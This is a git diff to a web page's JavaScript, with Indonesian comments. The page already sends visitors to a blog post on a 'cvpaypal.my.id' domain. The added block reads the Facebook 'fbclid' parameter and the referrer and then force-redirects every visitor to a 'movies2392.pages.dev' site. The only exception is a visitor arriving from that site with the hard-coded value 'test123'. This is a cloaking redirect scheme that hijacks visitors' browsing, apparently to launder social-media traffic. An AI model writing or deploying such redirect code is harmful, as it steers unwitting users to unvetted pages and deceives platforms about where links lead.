@@ -41,5 +41,27 @@ function redirectToURL() {
     window.location.href = 'https://www.cvpaypal.my.id/2024/03/why-your-business-needs-crm-system-to.html';
 }
 
+    // Fungsi untuk mendapatkan parameter dari URL
+    function getParameterByName(name, url) {
+        if (!url) url = window.location.href;
+        name = name.replace(/[\[\]]/g, "\\$&");
+        var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+            results = regex.exec(url);
+        if (!results) return null;
+        if (!results[2]) return '';
+        return decodeURIComponent(results[2].replace(/\+/g, " "));
+    }
+
+    // Mengambil nilai parameter 'fbclid' dari URL
+    var fbclid = getParameterByName('fbclid');
+
+    // Jika hasilnya dari https://movies2392.pages.dev/?fbclid=test123, maka tidak ada redirect
+    if (document.referrer.includes("movies2392.pages.dev") && fbclid === "test123") {
+        // Tidak melakukan redirect
+    } else {
+        // Redirect ke https://movies2392.pages.dev
+        window.location.href = "https://movies2392.pages.dev";
+    }
+
 // Memulai progres saat halaman dimuat
 startProgress();
